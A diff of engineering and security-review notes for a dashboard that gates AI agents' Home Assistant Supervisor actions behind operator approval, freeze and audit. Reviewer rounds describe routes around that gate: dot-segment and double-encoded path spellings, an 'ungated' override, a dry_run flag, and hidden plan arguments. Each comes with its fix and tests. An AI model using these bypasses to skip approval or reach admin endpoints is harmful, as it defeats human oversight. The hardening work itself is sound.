+card carries the same red line as the reboot (the server prefixes the summary
+with `⚠ Admin power: …`), and P1 keeps these tools out of plans entirely.
+
+#### 4. `call_service(domain='hassio')`
+
+Refused with an audited `hassio_domain_refused` (403) before any queue entry,
+unless the agent's own policy lists `hassio` in the `ha_call_service`
+`domain_allow` list — the operator's explicit, audited escape hatch. The
+refusal message points at the F10 tools. Tested both ways, plus the "other
+domains are untouched" case.
+
+#### 5. Preflight, the summary, and timeouts
+
+* Each action is validated by `_preflight_ha_supervisor_action` *before* the
+  approval is created: bad slug, bad action, bad backup name, an update with
+  no version available (`ha_update_not_available`) and a restart without a
+  recent valid check are refused instead of queued.
+* A viable action returns `{'_summary': …}`. `tool_runner` stores it in the new
+  `pending_integration_calls.summary` column, and the approval card renders it
+  (a red line for the reboot). The add-on update summary is
+  `addon_update | <slug> | <current> -> <target>`, read from
+  `/addons/{slug}/info`; core update reads `/core/info`.
+* **Timeouts (found while checking the source):** `supervisor/api` defaults
+  its per-call `timeout` to **10 s**, and updates/backups can run for minutes.
+  The action path therefore sends `timeout: 600` for backups and `120` for the
+  other supervisor/api calls, and raises the WebSocket read timeout to 620 s
+  (backup/update) or 60 s (everything else). Reads keep the 30 s default.
+
+#### 6. Plan items of type `mcp`
+
+`session_plan_items` gains `kind` (`ssh` default, so pre-F10 rows are
+unchanged), `integration`, `tool` and `args_hash`. An `mcp` item is proposed as
+`{kind: "mcp", integration, tool, args: {...}, max_uses}` and the dashboard
+stores the **hash only** — an HA service payload can carry a secret, and a plan
+row is rendered in the UI. Matching in `tool_runner` is integration + tool +
+the exact argument hash, one use per claim, through the same conditional
+UPDATE as the SSH claim; a different argument hash never matches. The SSH
+claim now filters `kind='ssh'`, so the two item types cannot cross-claim.
+
+#### 7. Tests
+
+`tests/test_f10_ha_supervisor_actions.py` (39) covers every case in the chunk:
+right endpoint/payload per action; unknown action and bad slug refused; restart
+without a recent valid check refused and queued after one; the reboot tool
+seeded disabled; the FORBIDDEN table walk; `call_service` with `hassio`
+refused by default and allowed only with an explicit policy; the preflight
+summary; an `mcp` plan item approving exactly one matching call and nothing
+else; freeze queueing nothing. `tests/test_ha_mcp.py` and
+`tests/test_integrations.py` were updated for the six new seeded tools.
+
+`bash scripts/verify.sh`: `2370 passed, 7 warnings in 445.42s (0:07:25)`.
+
+#### Open questions
+
+1. The Supervisor REST payloads (backup create, restart, reboot, add-on
+   action) are closed-source; they come from the Supervisor API docs and this
+   chunk's spec. Please confirm `/backups/new/partial` takes
+   `{name, addons, folders}` against a live Supervisor before this ships.
+2. A slow add-on/Core update can exceed the 620 s read timeout. The Supervisor
+   continues the update; the tool then reports a timeout, which reads as a
+   failure to the agent. Options: a fire-and-poll mode (start, then read
+   `ha_addons`/`ha_core_info` for `version`), or a larger cap. This is a UX
+   decision, not a security one.
+3. The reboot warning is a red meta line driven by the tool name + summary.
+   A dedicated "destructive" card style belongs to the UI pass.
+
+### Round 2 — fixes for reviewer round 1 (M1–M2, S1)
+
+**Commit: `5ceb569`** on `feat/f10-ha-supervisor-actions`.
+
+* **M1 — the generic HA REST tools reached the Supervisor.**
+  `core/ha_supervisor.is_supervisor_rest_path` decodes the path, lowercases it,
+  collapses `//`, strips a leading `/` and an `api/` prefix, and matches
+  `hassio` and `services/hassio` (exact or as a prefix). `core/tool_runner`
+  refuses a HA-kind HTTP call **before gating**, so no approval card is ever
+  created and no upstream request is made; the audit row is
+  `rest_supervisor_refused` with `reason_code='supervisor_rest_refused'`.
+  `execute_integration_call` (rendered curated path) and
+  `execute_generic_call` (the generic path, and the `verify_path` GET) re-check
+  it, so an already-approved pending call is refused too (the F9 R2 shape).
+  Tests, in `TestSupervisorRestGuard`: every spelling (`/api/hassio/…`,
+  `api//HASSIO//…`, `/api/%68assio/…`, `/api/services/hassio/…` and the
+  services spelling with a percent-encoded `h`) is refused by both the generic
+  read and the generic write, with `mock_upstream['requests'] == []` and no
+  pending call; an approved pending call is refused and runs nothing; every
+  FORBIDDEN prefix has a REST spelling; no curated HA template names a
+  Supervisor path; and the refusal is audited.
+  **Checked against HA Core (`components/hassio/http.py`, `dev`,
+  2026-11-09):** `HassIOView` is registered at `/api/hassio/{path:.+}` and
+  both `get` and `post` proxy to the Supervisor. It is admin-only except for
+  the add-on logo/icon paths, and `backups/…`, `addons/<slug>/logs/…` and the
+  log tails have **no timeout** (`NO_TIMEOUT`), so a generic call could also
+  park a request for ever. `/api/services/hassio/<service>` is the ordinary
+  Core service API for the `hassio` domain. The view rejects a path that is
+  not equal to its `unquote`, so HA itself decodes once; the guard refuses
+  rather than normalising-and-sending.
+* **M2 — MCP plan items were not bound to the caller.**
+  `claim_mcp_plan_item` takes the calling agent and joins `sessions` in the
+  same statement as the claim (`s.agent != '' AND s.agent = ?`), so a
+  concurrent ownership change cannot slip between the check and the use, and
+  an ownerless session (or no authenticated agent) matches nothing — F3 SR2's
+  fail-closed rule. `tool_runner` passes the authenticated agent name, not the
+  `mcp` display label. Tests: `test_another_agents_session_is_not_claimable`
+  (B's call is queued for the operator, A's item keeps its use and runs
+  exactly once) and `test_an_ownerless_session_is_not_claimable`.
+* **S1 — `ha_host_reboot` was plan-coverable.**
+  `_validate_mcp_item` refuses an `mcp` item naming `ha_host_reboot` when the
+  plan is proposed (`PlanError('not_plan_coverable')`), so every reboot has its
+  own approval card. Test: `test_host_reboot_is_not_plan_coverable`.
+
+`bash scripts/verify.sh`: `2393 passed, 7 warnings in 458.83s (0:07:38)`.
+
+### Round 3 — N1 (round 2 review): non-canonical paths
+
+**Commit: `2f0fdf1`.**
+
+`is_supervisor_rest_path` now refuses a path **whatever its prefix** when it
+is not canonical:
+
+* it is percent-decoded **until stable** (one pass let `%252e%252e` become
+  `%2e%2e`, which the proxy then decoded);
+* any `.` or `..` segment, a backslash, or a NUL/control character is
+  refused — HA has no legitimate API path with those;
+* only then are `//`, the leading `/` and an `api/` prefix stripped and the
+  Supervisor prefixes checked, as before.
+
+Refusing beats normalising because the bytes sent must be the bytes checked:
+`urllib` sends the path verbatim, and nginx/NPM in front of HA resolves dot
+segments and decodes `%2e`, so `api/states/../hassio/backups/x/restore`
+would otherwise reach the Supervisor.
+
+The table runs seven spellings through **all three checkpoints** (21 tests):
+`api/states/../hassio/backups/x/restore`, `api/./hassio/host/reboot`,
+`api/states/%2e%2e/hassio/x`, `api/services/./hassio/x`,
+`api/hassio\backups`, `api/services/%252e%252e/hassio/x` and a NUL byte.
+`test_a_non_canonical_path_is_refused_before_gating` (no pending call, no
+upstream request), `..._by_the_curated_executor` (`execute_integration_call`)
+and `..._by_the_generic_executor` (`execute_generic_call`) each assert a 403.
+
+`bash scripts/verify.sh`: `2414 passed, 7 warnings in 469.74s (0:07:49)`.
+
+### Round 4 — security code review (P1–P3, S-a, S-b)
+
+**Commit: `2a2ca70`.** The security reviewer re-reads only this diff; each
+point is a separate block in `tool_runner.py`, `session_plans.py`,
+`tool_handlers.py` and `ha_supervisor.py`.
+
+* **P1 — a plan item must be readable, and only curated actions are
+  coverable.** `_validate_mcp_item` now requires `args` (a bare `args_hash` is
+  refused) and matches on the hash of those args; a supplied hash that does
+  not match is refused. It stores a redacted display copy (`args_json`, via
+  the existing scrubber) and, for a handler tool, the preflight `_summary`;
+  `_plan_payload` exposes both to the plan card, which shows the summary and
+  the arguments under the command. Coverage is an allowlist,
+  `PLAN_COVERABLE_TOOLS` = the five curated actions; the generic
+  read/write, `call_service`, `ws_write` and `ha_host_reboot` are refused as
+  `not_plan_coverable` (S1 follows from the allowlist). Tests:
+  `test_a_bare_args_hash_is_refused`,
+  `test_the_plan_card_shows_the_redacted_arguments`,
+  `test_only_the_curated_actions_are_coverable`,
+  `test_every_curated_action_is_coverable`.
+* **P2 — `always_gate` wins over an agent's `ungated`.** The override is
+  ignored on an `always_gate` tool (wildcards included, because the guard is
+  on the tool, not on the lookup), and the ignored override is audited once
+  per agent and tool (`mcp_ungated_ignored`). Tests: every enabled F10 action
+  against `*: ungated`, `ha.*: ungated` and an exact
+  `ha.ha_core_update: ungated` still queues, and the audit row appears once.
+* **P3 — the config check is re-checked at the call.** `_config_check_fresh`
+  is shared by the preflight and by `_h_ha_supervisor_action`, which now
+  refuses a `ha_core_restart` with `ha_check_config_stale` immediately before
+  `run_supervisor_action`. That covers a plan-claimed restart, an approval
+  that arrives after the check expired, and any other path that reaches the
+  handler. Tests: a plan-claimed restart with an expired check is refused and
+  opens no WebSocket; a late approval stores the refusal and sends nothing;
+  the handler refuses directly.
+* **S-a — the Supervisor prefix is the whole first segment.** The guard now
+  refuses any first segment starting with `hassio` (which covers the add-on
+  ingress proxy, `hassio_ingress/...`) and runs on the path the request
+  carries, including the integration's own base path
+  (`is_supervisor_rest_request`). Tests: a `hassio_ingress` spelling through
+  all three checkpoints, and an integration whose `base_url` ends in
+  `/hassio`.
+* **S-b — config writes grant admin power.** §3 documents where FORBIDDEN
+  stops; the server prefixes the approval summary with `⚠ Admin power: …` for
+  an HA write to the automation/script/scene config API, and the integration
+  card renders any summary starting with `⚠` in the danger colour (the same
+  line the reboot gets). Test: the pending call's summary carries the
+  warning.
+
+Both the merged gateway script and this diff keep the CI fix's capture code;
+the F12 merge is separate.
+
+`bash scripts/verify.sh`: `2459 passed, 14 skipped, 7 warnings in 486.12s (0:08:06)`.
 
 ### Reviewer notes
 
-_(reviewer)_
+**Round 1 (2026-11-09, main feature reviewer): changes requested.** 177 F10,
+F9, F3, HA and integration tests pass locally.
+
+*What holds:*
+
+* Every action is always-gated and audited, and freeze blocks it.
+* `SLUG_RE` (`^[a-z0-9_]{1,64}$`) makes path tricks in slugs impossible.
+* Shapers pass only named fields, so `options` never reaches an add-on.
+* `ha_host_reboot` is seeded disabled.
+* `ha_core_restart` needs a recent valid config check.
+* `call_service(domain='hassio')` is refused unless allowed (domain check
+  is trimmed and case-folded).
+
+*Must fix:*
+
+* **M1 The generic HA REST tools reach the Supervisor.** F9 R2 closed
+  `ws_write`, but the HA integration's generic REST `read`/`write` are not
+  checked for:
+  * `/api/hassio/…`, HA Core's Supervisor proxy, which admin tokens can use;
+  * `/api/services/hassio/…`, the same services `call_service` now refuses.
+
+  So "FORBIDDEN endpoints are unreachable from every tool" does not hold:
+  a backup restore or host shutdown is one approval away through the
+  generic write. Fix: in `tool_runner`, for HA-kind integrations, refuse a
+  generic REST call whose normalised path (percent-decoded, lowercased,
+  `//` collapsed, leading `/` and an `api/` prefix stripped) starts with
+  `hassio/` or `services/hassio/`, before gating and when a pending call is
+  approved (mirror F9 R2).
+  * Extend the FORBIDDEN table test to walk **every** HA tool, including the
+    generic read and write, with each spelling.
+  * Confirm against HA Core's `components/hassio/http.py` which `/api/hassio`
+    paths exist, and record it in the notes.
+* **M2 MCP plan items are not bound to the caller.** `claim_mcp_plan_item`
+  matches on `session_id`, integration, tool and the argument hash. But an
+  MCP caller can name **any** session id (`resolve_session` takes the
+  explicit value as is). Agent B could therefore spend agent A's approved
+  "update add-on X" item. Require the session's owner to equal the calling
+  agent (fail closed for ownerless sessions, as in F3's SR2) before
+  claiming. Tests: B cannot claim A's item, and A claims it exactly once.
+
+*Should fix:*
+
+* **S1** `ha_host_reboot` should never be plan-coverable. Each reboot gets
+  its own approval card with the red line. Refuse `mcp` plan items naming
+  it when a plan is proposed.
+* **S2** Answer to the open questions: keep the partial-backup payload
+  behind a "verify against a live instance" note. Raise long-update
+  timeouts as their own setting, not the shared read timeout. The
+  "destructive" card style goes to the UI pass list.
+
+**Needs the security reviewer before merge (§ 2.6a).** F10 adds a new
+auto-approve path for integration calls (plan items of kind `mcp`), in
+addition to the Supervisor actions.
+
+**Round 2 (2026-11-10, `5ceb569`): one fix left (N1).** M2 and S1 are fixed
+as asked:
+* the MCP plan claim joins `sessions` and requires `s.agent = owner`, with
+  ownerless sessions matching nothing, in the same statement as the claim;
+* `ha_host_reboot` can never be a plan item.
+
+M1's three checkpoints are right: before gating, in the curated executor and
+in the generic executor. 95 F10 and F3 tests pass locally.
+
+* **N1 (must): dot segments get past `is_supervisor_rest_path`.** It decodes
+  once and checks a prefix, but never resolves `.` or `..`:
+  * `api/states/../hassio/backups/x/restore` → not refused;
+  * `api/./hassio/host/reboot` → not refused;
+  * `api/states/%2e%2e/hassio/x` → not refused;
+  * `api/services/./hassio/x` → not refused;
+  * `api/hassio\backups` → not refused.
+  
+  `urllib.request` sends these paths exactly as given. A reverse proxy in
+  front of HA (nginx, which is what NPM is) resolves dot segments and
+  decodes `%2e`, so the request can still reach `/api/hassio/...`. Fix: in
+  the check, unquote **until stable**, then **refuse** any HA REST path that
+  contains a `.` or `..` segment, a backslash, or a NUL/control character,
+  whatever its prefix. HA has no legitimate API path with those. Only then
+  apply the prefix check. Refusing beats normalising, because the bytes sent
+  must be the bytes checked. Add the five spellings above, and
+  `%252e%252e`, to the table test, through all three checkpoints.
+
+**After N1:** to the security reviewer (§ 2.6a), with the M1 table, N1 and
+the `mcp` plan-claim owner binding as the points to check.
+
+**Round 3 (2026-11-10, `2f0fdf1`): approved by the feature reviewer,
+to security.** `is_supervisor_rest_path` now unquotes until the path stops
+changing. It then refuses any dot segment, backslash or control character,
+whatever the prefix, before the prefix check. I re-probed it with 15
+spellings: every round 2 bypass, plus `%252e%252e`, `..%2f`, `hassio%2f`,
+upper case, a trailing `..` and `%00`. All are refused, while
+`api/states/light.kitchen`, `api/services/light/turn_on` and an encoded
+space still pass. 116 F10 and F3 tests pass locally.
+**Next:** the security reviewer (§ 2.6a). Points to check: the M1 three
+checkpoints and N1, the `mcp` plan-claim owner binding (M2), and
+`ha_host_reboot` never being plan-coverable (S1).
+
+#### Security reviewer sign-off
+
+**Code review (`3a6f65b`), 2026-11-10: changes requested (P1–P3).** I read
+`ha_supervisor.py`, the three checkpoints in `tool_runner.py` and
+`integration_proxy.py`, `session_plans.py`, the `session_plan` MCP tool and
+the approval-mode lookup. I did not run anything.
+
+*The three points I was asked to check hold:*
+
+* **M1 and N1, the path guard.**
+  - The guard runs at all three checkpoints: before gating, in the curated
+    executor and in the generic executor. An already-approved call is
+    re-checked when it runs.
+  - Decoding until the path stops changing, then refusing dot segments,
+    backslashes and control characters whatever the prefix, is the right
+    shape. Refusing beats normalising.
+  - I found no spelling that gets past it through the query string, `;`,
+    repeated encoding or case.
+* **M2, the owner binding.** The plan claim checks the session's owner in
+  the same statement, so an ownerless session or an unauthenticated caller
+  matches nothing.
+* **S1.** `ha_host_reboot` can never be a plan item.
+
+*Must fix:*
+
+* **P1. An operator can approve a plan item without being able to see what
+  it does.**
+  - `_validate_mcp_item` accepts an `args_hash` from the agent with no
+    `args`. Even when `args` are given, only the hash is kept.
+  - The operator's plan card therefore shows `mcp: <integration>.<tool>
+    (<12 hex chars>)`, and they approve bytes they cannot read.
+  - Any tool can be a plan item, including the HA generic write and
+    `call_service`. There, the hidden arguments are an arbitrary path and
+    body.
+  - Fix 1: refuse a bare `args_hash`. `args` are required.
+  - Fix 2: when the plan is proposed, keep a display copy of the arguments
+    for the plan card, with secret-looking keys redacted by the existing
+    scrubber, and match on the hash as now. For a handler tool, also store
+    its preflight summary, for example `addon_update | slug | 1.2 -> 1.3`,
+    and show that.
+  - Fix 3: make plan coverage an allowlist, not one excluded tool. Only the
+    curated F10 actions can be plan items: add-on action, add-on update,
+    Core update, backup create and Core restart. The generic read and write,
+    `call_service`, `ws_write` and the reboot never can. S1 then follows
+    from the allowlist.
+  - Tests:
+    - a bare hash is refused;
+    - the plan card shows the redacted arguments or the summary;
+    - a generic-write or `call_service` item is refused as
+      `not_plan_coverable`.
+* **P2. An agent's "ungated" override switches off `always_gate`.** In
+  `tool_runner`, `approval_mode() == 'ungated'` sets `should_gate = False`
+  after `always_gate` set it to True. The lookup also falls back to the
+  `ha.*`, `ha_*` and `*` wildcards.
+  - Result: an agent whose policy said `ha.*: ungated` before F10 now runs
+    backups, updates, restarts, and reboots once enabled, with no approval
+    card at all.
+  - Fix: on an `always_gate` tool, ignore `ungated`. Plans (P1) are the one
+    way to pre-approve these, and the reboot can never be pre-approved.
+    Audit an ignored override once per agent and tool, so the operator
+    learns why it had no effect.
+  - Tests: `*: ungated`, `ha.*: ungated` and an exact `ha.ha_core_update:
+    ungated` each still queue the call.
+* **P3. The config-check rule for a Core restart is checked only in
+  preflight.** Preflight runs only when the call is queued, so the rule is
+  skipped in three cases:
+  - a plan-claimed restart;
+  - an ungated one (until P2 is fixed);
+  - an approval that arrives long after the check went stale.
+
+  Fix: check "a valid `ha_check_config` within 10 minutes" again inside the
+  restart handler, right before the POST, and refuse with
+  `ha_check_config_stale`. Tests: a plan-claimed restart with no recent
+  check is refused; an approval that arrives after the check expired is
+  refused and nothing is sent.
+
+*Should fix:*
+
+* **S-a. Widen the Supervisor prefix to the whole first segment.** Refuse
+  any path whose first segment starts with `hassio`, which also covers HA's
+  add-on ingress proxy, `hassio_ingress`. Run the check on the full request
+  path, including any path that is part of the integration's own
+  `base_url`, not only on the tool's part. Test: a `hassio_ingress/...`
+  path is refused at all three checkpoints.
+* **S-b. Say where FORBIDDEN stops.** An approved generic HA write to the
+  automation, script or scene config API can define an action that calls
+  any `hassio.*` service, and running it reaches what FORBIDDEN names.
+  Scanning the body cannot catch this, because templates can build the
+  domain name. Document it in § 3: FORBIDDEN covers direct paths, and
+  approving a config write grants admin power. Give those approval cards
+  the same red line as the reboot. P1 already keeps them out of plans.
+
+**Verdict:** changes requested. Once P1–P3 have their tests, I review only
+that diff. F10 must not merge before then.
+
+**Round 4 code review (feature reviewer, 2026-11-10, `2a2ca70` on `b8b5f48`):
+approved; to the security reviewer for the P1–P3 diff.** CI is green;
+`tests/test_f10_ha_supervisor_actions.py`: 111 passed here.
+
+* **P1:** an `mcp` plan item needs a `dict` of `args` (a bare hash is refused,
+  a supplied hash must match); coverage is an allowlist of the five curated
+  actions; the card shows the scrubbed arguments and the preflight summary,
+  both through `escapeHtml`.
+* **P2:** `ungated` no longer clears `always_gate`, for exact keys and
+  wildcards; the ignored override is audited once per agent and tool.
+* **P3:** `_config_check_fresh` runs in the handler right before the restart,
+  so plan-claimed, ungated and late-approved restarts are refused.
+* **S-a / S-b:** `hassio*` first segments (ingress) are refused, the check
+  includes the integration's base path, and automation/script/scene writes
+  carry the red admin-power line.
+
+Two small hardening points. Fold them with any security changes; they do not
+need another round from me:
+* **R1:** `claim_mcp_plan_item` does not re-check `PLAN_COVERABLE_TOOLS`. Only
+  `create_plan` checks it today, which is enough, but one extra
+  `tool in PLAN_COVERABLE_TOOLS` test at claim time keeps a future insert path
+  from widening coverage.
+* **R2:** the allowlist is by tool name only. Also require the integration's
+  `kind == 'ha'` at validation and at claim, matching F16's V6 rule (kind +
+  tool).
+
+### Round 4 — R1 and R2
+
+**Commit: `8f76878`** (`dashboard/db/session_plans.py` and
+`tests/test_f10_ha_supervisor_actions.py`). It is the only code commit the
+security reviewer needs to read: the diff adds R1/R2 on top of `2a2ca70`
+(P1–P3, S-a/S-b), so the P1–P3 diff and R1–R2 are read together.
+
+* **R1 — the claim re-checks the tool.** `claim_mcp_plan_item` returns `None`
+  for anything outside `PLAN_COVERABLE_TOOLS` before it opens the plan, so a
+  row written by a future insert path cannot widen what an approved plan
+  spends. `create_plan` still refuses it first; this is the same allowlist
+  applied at the point of use.
+* **R2 — (kind, tool), not the tool name.** An `mcp` item must name an
+  integration whose row has `kind == 'ha'`, checked in `_validate_mcp_item`
+  and again in `claim_mcp_plan_item`. The kind is read from the integrations
+  row by name, never taken from the caller (the item stores the name and the
+  claim matches the name, so the kind has to come from the same row); an
+  unknown name is not HA and is refused the same way. `create_plan`'s order
+  is unchanged, so a non-curated tool or a bare `args_hash` is still reported
+  as before, and an unknown integration only fails once the item is otherwise
+  valid.
+* **Tests** (`TestPlanCoverage`): validation refuses a custom-kind
+  integration and an unknown one (`not_plan_coverable`, with the name in the
+  message); a row whose `tool` was changed to `write` directly in the table is
+  not claimable, and the same row is claimable after the tool is put back; a
+  row whose `integration` was changed to a custom-kind one is not claimable,
+  and is claimable again once re-pointed at `ha`. The "put it back" halves
+  show each refusal is the new check and not a broken fixture.
+  Tests that create an `mcp` plan item now take the `ha` fixture, since the
+  item needs a real HA integration row.
+
+`bash scripts/verify.sh`: `2462 passed, 14 skipped, 7 warnings in 488.87s (0:08:08)`.
+
+### Security review — P1–P3 and R1–R2 code (2026-11-10, `2a2ca70` + `8f76878`)
+
+**Verdict: changes requested. One blocker (K1), one must (K2) and one small
+fix (K3).** P1–P3, S-a, S-b, R1 and R2 are done as asked. K1 is in code from
+before this diff. I missed it in my first F10 code review; it was found while
+checking how P2's `always_gate` interacts with the rest of the gate.
+
+What is right:
+* **P1:** a plan item needs its real `args`, and a supplied hash must match
+  them. Coverage is an allowlist of five actions. The card shows the scrubbed
+  arguments and the summary, both escaped.
+* **P2:** an `ungated` override cannot remove `always_gate`, including
+  wildcards, and the ignored override is audited.
+* **P3:** the 10-minute check is repeated in the handler, just before the
+  restart.
+* **R1 and R2:** the claim checks the tool allowlist again and requires an
+  integration of kind `ha`, read from the row.
+* **S-a:** `hassio*` first segments are refused, and the base path is checked
+  at the runner and in `execute_generic_call`.
+* **S-b:** the red line appears on the card.
+
+Changes:
+
+* **K1 (blocker): a handler dry-run skips the gate even when the handler has
+  no dry-run.**
+  * `tool_runner.py:614` sets `should_gate = False` for *any* handler call
+    that carries a truthy `dry_run`. The freeze check at `:474` has the same
+    exemption.
+  * The comment says curated handlers honour `dry_run`. The
+    `ha_supervisor_action` handler, used by all six Supervisor tools including
+    the reboot, does not: `run_supervisor_action` never reads it.
+  * So the exemption skips the approval card and Emergency Freeze, and then
+    runs the real action. `always_gate`, P2 and the plan rules never come into
+    play.
+
+  Fix:
+  * Exempt only handlers that are listed as implementing a dry run, in a
+    named set next to `HANDLERS` (for example `DRY_RUN_HANDLERS`). Use the
+    same set at both places in the runner.
+  * `ha_supervisor_action` is not in that set.
+  * As a second layer, the Supervisor handler refuses a call whose arguments
+    include `dry_run`.
+
+  Test: for each of the six Supervisor tools, a call with `dry_run` set
+  queues a card (or is refused) and makes no Supervisor request, both with
+  and without freeze. F11's `ha_config_write` will rely on the same set, so
+  its dry run must be the one in the set and must open no write.
+* **K2 (must): an automation, script or scene config write can still skip
+  the card.**
+  * S-b adds the red line to the *card*, but an agent policy of `ungated`
+    (exact, `ha.*` or `*`) on the generic write tool means no card is made.
+  * Writing an automation and then triggering it reaches any `hassio.*`
+    service. That is the power P2 keeps gated.
+
+  Fix: treat `is_admin_config_write(path)` like `always_gate`. `ungated` does
+  not clear it, and the override is audited the same way. The generic write
+  is not plan-coverable, so this closes it.
+
+  Test: `ha.*: ungated` plus a write under `config/automation/` queues a card
+  with the red line.
+* **K3 (should, one line): the third S-a check point.**
+  `integration_proxy.py:755` (`execute_integration_call`) still calls
+  `is_supervisor_rest_path(path)` without the base path. Switch it to
+  `is_supervisor_rest_request(integration.get('base_url'), path)`, as at the
+  other two.
+* **Nits:**
+  * `_mcp_display` truncates the argument display at 2000 bytes, while the
+    match uses the full arguments. Refuse an item whose display would be
+    truncated, so the operator never approves a hidden tail. The curated
+    actions take short arguments.
+  * `_normalise_rest_path`'s docstring says it returns `''` for a
+    non-canonical path; it returns `None`.
+
+After K1–K3, I review only that diff.
+
+**Security reviewer — K1 severity (2026-11-10, after `9ecd160`):** I accept
+the reachability check. FastMCP generates one function per tool and drops
+undeclared arguments. No Supervisor tool declares `dry_run`, and
+`lovelace_save_config`, the only tool that does, honours it. So K1 cannot be
+reached over MCP today, and nothing live is exposed. **K1 drops from blocker
+to must (defence in depth).**
+
+It still lands before F10 merges, for three reasons:
+* the runner's rule is wrong whatever the transport;
+* an operator can add a `dry_run` parameter to a tool's params;
+* F16's recipe engine will build arguments itself, without going through
+  FastMCP.
+
+K2 and K3 are unchanged.
+
+**K1 reachability (feature reviewer, 2026-11-10).** K1 is right about the code,
+and the fix stands. It cannot be reached over MCP today, though:
+* `_build_tool_fn` gives every integration tool a typed signature built from
+  its declared `params`. FastMCP (mcp 1.29) **drops undeclared arguments**:
+  calling a tool that declares only `slug` with `{"slug": "x",
+  "dry_run": true}` hands the function `slug` and `session_id` only (checked
+  here).
+* Only one seeded tool declares `dry_run`: `lovelace_save_config`. Its
+  handler honours it, on `master`, on `feature-roadmap` and on F10. None of
+  the six Supervisor tools declares it.
+
+So no live gateway or dashboard is exposed, and Release 1 is not affected.
+K1 is still a real safety net: an operator-edited tool, a future seed, or a
+non-MCP caller could declare or pass `dry_run`. Fix as asked: a named set of
+handlers that implement a dry run, used at both places; the Supervisor
+handler refuses `dry_run`. Add one test that a declared-but-unsupported
+`dry_run` on a Supervisor tool is still gated and frozen.
+
+### Round 5 — K1, K2, K3 and the two nits
+
+**Commit: `a463d31`.** It is the only code commit for this round, laid on top
+of `8f76878` (R1/R2) and `2a2ca70` (P1–P3, S-a/S-b); the security reviewer
+reads this diff next.
+
+* **K1 — a named set of handlers that really dry-run.** `DRY_RUN_HANDLERS`
+  sits next to `HANDLERS` in `core/tool_handlers.py` and holds
+  `ha_lovelace_save_config` only. `tool_runner` asks
+  `_dry_run_exempt(handler, args)`, which is `handler in DRY_RUN_HANDLERS`
+  and the argument, at **both** places: the freeze check and the gate skip.
+  A handler that ignores `dry_run` (the Supervisor action handler, any
+  REST/WS/generic tool) is no longer exempt, so `dry_run: true` cannot run
+  the real action with no card and no freeze. As the second layer,
+  `_h_ha_supervisor_action` refuses a call whose arguments contain `dry_run`
+  with `ha_supervisor_dry_run_unsupported` (400).
+  Tests: each of the six Supervisor tools with `dry_run: true` (the reboot is
+  enabled in the test, since the seed disables it) queues a card and makes no
+  action call — the update preflights' GETs are allowed through — and, with
+  freeze on, is refused `frozen` with nothing queued; the handler refuses
+  `dry_run` directly; a tool whose params declare `dry_run` but whose handler
+  is not in the set stays gated. `ha_lovelace_save_config` keeps its
+  pre-gate dry run (the F9 tests cover it).
+* **K2 — an admin config write is `always_gate`.** `is_admin_config_write`
+  on the request path (automation/script/scene) now ORs into the same
+  `always` flag as `tool.get('always_gate')`: it forces the card even under
+  `gate_mode=destructive` with a non-destructive verb, `ungated` cannot clear
+  it, and the ignored override is audited through `_audit_ignored_ungated`.
+  The red admin-power line is unchanged and now rides on a card that always
+  exists.
+  Tests: `*: ungated` with each of the three prefixes (and a query string)
+  queues a card whose summary starts with the warning; the audit row appears
+  once; the predicate is scoped to those prefixes and not to `/api/states` or
+  `/api/services`.
+* **K3 — the executor checks the base path too.**
+  `execute_integration_call` now calls
+  `is_supervisor_rest_request(integration.get('base_url'), path)` — the same
+  call as the runner and `execute_generic_call`. Test: an `ha` integration
+  whose base URL ends in `/hassio`, a generic tool path `backups`, and the
+  executor refuses with 403 and sends nothing upstream.
+* **Nits.** An mcp item whose redacted argument display would exceed
+  `MAX_ARGS_DISPLAY` (2 000 bytes) is refused with `invalid_args` instead of
+  truncated, so the card never hides a tail that the hash still matches; the
+  test builds a 3 000-byte argument. `_normalise_rest_path`'s docstring now
+  says `None` (what it returns for a non-canonical path) and `''` only for an
+  empty one — code unchanged.
+
+`bash scripts/verify.sh`: `2485 passed, 14 skipped, 7 warnings in 501.02s (0:08:21)`.
+
+**K1–K3 review (feature reviewer, 2026-11-10, `a463d31`): approved; to the
+security reviewer for that diff only.** K1: `DRY_RUN_HANDLERS` (only
+`ha_lovelace_save_config`) behind one `_dry_run_exempt()` at both the freeze
+check and the gate skip, and the Supervisor handler refuses `dry_run`. K2:
+`is_admin_config_write` sets the same `always` flag as `always_gate`, so
+`ungated` cannot skip the card. K3: `execute_integration_call` uses
+`is_supervisor_rest_request`. Both nits are done.
+
+**Security reviewer — K1–K3 (2026-11-10, `a463d31`): approved. F10 may
+merge.**
+* **K1:**
+  * `_dry_run_exempt()` is the only exemption, and it is used at both the
+    freeze check and the gate skip.
+  * `DRY_RUN_HANDLERS` holds only `ha_lovelace_save_config`, whose handler
+    does return before writing on `dry_run`.
+  * The Supervisor handler refuses any call whose arguments include
+    `dry_run`, so a future runner mistake still fails closed.
+  * The tests cover all six Supervisor tools, gated and frozen, plus a
+    handler that declares `dry_run` but is not on the list.
+* **K2:** an admin config write sets the same `always` flag as
+  `always_gate`. `ungated` is audited and ignored, and the red line comes
+  from the same flag. A generic write still can't be covered by a plan, so
+  the card is the only way through.
+* **K3:** all three check points now include the base path.
+* **Nits:**
+  * Over-long plan arguments are refused, not truncated.
+  * The docstring is fixed.
+  * One leftover, which does not block: if `_mcp_display` hits an exception,
+    it returns `''`, which passes the length check and shows no arguments.
+    Refuse the item when the display is empty but `args` is not, on the
+    next F10 touch or F16.
 
 ---
 
@@ -4803,11 +6000,1712 @@ without an SSH client or key.
 
 ### Implementer notes
 
-_(fill in)_
+**Status: design note only — no code on this branch.** Wait for the reviewer
+to mark it approved, and for the security reviewer's sign-off (§ 2.6a): this
+chunk gives the dashboard a key that reaches every gateway.
+
+#### 1. The shape of the change
+
+```
+agent ──MCP──▶ dashboard.ssh_exec(host, command)
+                 │  1. agent policy (hosts, ssh_mode, rate limit)
+                 │  2. resolve host → gateway row (IP/hostname only)
+                 │  3. ssh -i $ESHU_SSH_KEY_DIR/dashboard_ed25519
+                 │        eshu-gateway@<host>
+                 │        "ESHU_AGENT=… ESHU_AGENT_SIG=… ESHU_TS=… ESHU_NONCE=…
+                 │         ESHU_MCP=1 [ESHU_FORCE_JIT=1] <command>"
+                 ▼
+            gateway forced command (unchanged entry point)
+                 │  validate the prefix (command-bound MAC, nonce, gateway id)
+                 │  freeze → blocklist → [allowlist / window unless force_jit]
+                 │  → Zero-Trust → JIT
+                 │  MCP mode: capture ALL command output and print exactly one
+                 │  envelope; never sit waiting on a JIT
+                 ▼
+            dashboard parses the envelope
